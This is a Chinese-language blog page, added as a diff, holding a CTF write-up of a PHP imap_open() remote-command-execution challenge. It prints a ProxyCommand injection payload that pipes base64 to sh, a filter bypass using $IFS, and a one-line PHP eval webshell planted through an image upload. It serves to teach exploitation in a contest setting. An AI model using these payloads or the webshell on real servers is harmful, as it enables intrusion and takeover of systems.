@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    安恒2月赛my email的imap_open() RCE | 道萝岗特森&#39;s Blog
+  </title>
+  <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  writeup,php
+  ">
+  
+  <meta name="author" content="daolgts">
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+<script>
+  var _hmt = _hmt || [];
+  (function(){var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
+    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
+</script>
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+</head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">This website</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        <!--  -->
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+          <li><a href="/links">Links</a></li>
+        
+        
+          <li><a href="/about">About</a></li>
+        
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 34 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 15 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1552055068000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1552055068000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>安恒2月赛my email的imap_open() RCE</h1>
+    <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>2019安恒2月月赛的my email题目，自己做的时候没有思路，看了wp才了解是imap_open() RCE漏洞</p>
+<h1 id="0x01-imap-open"><a href="#0x01-imap-open" class="headerlink" title="0x01 imap_open()"></a>0x01 imap_open()</h1><p><code>imap_open()</code>是php来处理邮件的函数</p>
+<p><img src="https://s2.ax1x.com/2019/03/02/kbHFHJ.png" alt="kbHFHJ.png"></p>
+<p>题目利用的<code>imap_open()</code>漏洞,第一个参数可以执行系统命令</p>
+<p><a href="https://github.com/Bo0oM/PHP_imap_open_exploit" target="_blank" rel="noopener">https://github.com/Bo0oM/PHP_imap_open_exploit</a></p>
+<p>exploit.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># CRLF (c)</span><br><span class="line"># echo &apos;1234567890&apos;&gt;/tmp/test0001</span><br><span class="line">$server = &quot;x -oProxyCommand=echo\tZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64\t-d|sh&#125;&quot;;</span><br><span class="line">imap_open(&apos;&#123;&apos;.$server.&apos;:143/imap&#125;INBOX&apos;, &apos;&apos;, &apos;&apos;) or die(&quot;\n\nError: &quot;.imap_last_error());</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-题目测试"><a href="#0x02-题目测试" class="headerlink" title="0x02 题目测试"></a>0x02 题目测试</h1><p>在注册登录之后进行填写信息</p>
+<p><img src="https://s2.ax1x.com/2019/03/02/kbHo5R.png" alt="kbHo5R.png"></p>
+<p>发现有个server参数</p>
+<p>填写之前的payload发现参数不允许，测试发现是过滤了<code>base64</code>，<code>\</code>，<code>|</code>,并且也没有回显，好像就不能任意执行命令了</p>
+<h1 id="0x03-上传功能写shell"><a href="#0x03-上传功能写shell" class="headerlink" title="0x03 上传功能写shell"></a>0x03 上传功能写shell</h1><p>点击更换背景，是一个上传页面，只能传图片文件，并且会更换为背景</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">body&#123;</span><br><span class="line">    background-image: url(./user/daolgts.jpg);</span><br><span class="line">    background-size: 100%,100%;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在页面源码中发现背景图片的路径，也就是上传的图片的路径</p>
+<p>结合rce漏洞，可以直接使用<code>bash filename</code>来执行命令</p>
+<p>上传图片，内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_REQUEST[&apos;daolgts&apos;]);&quot;&gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>然后执行命令生成webshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x -o ProxyCommand=bash&#123;$IFS&#125;daolgts.jpg&#125;</span><br></pre></td></tr></table></figure>
+
+<p>菜刀连接<code>/user/shell.php</code>，flag在<code>flag.php</code>里</p>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="https://daolgts.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 daolgts</li>
+      <li><a href="https://daolgts.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/daolgts">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
+      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
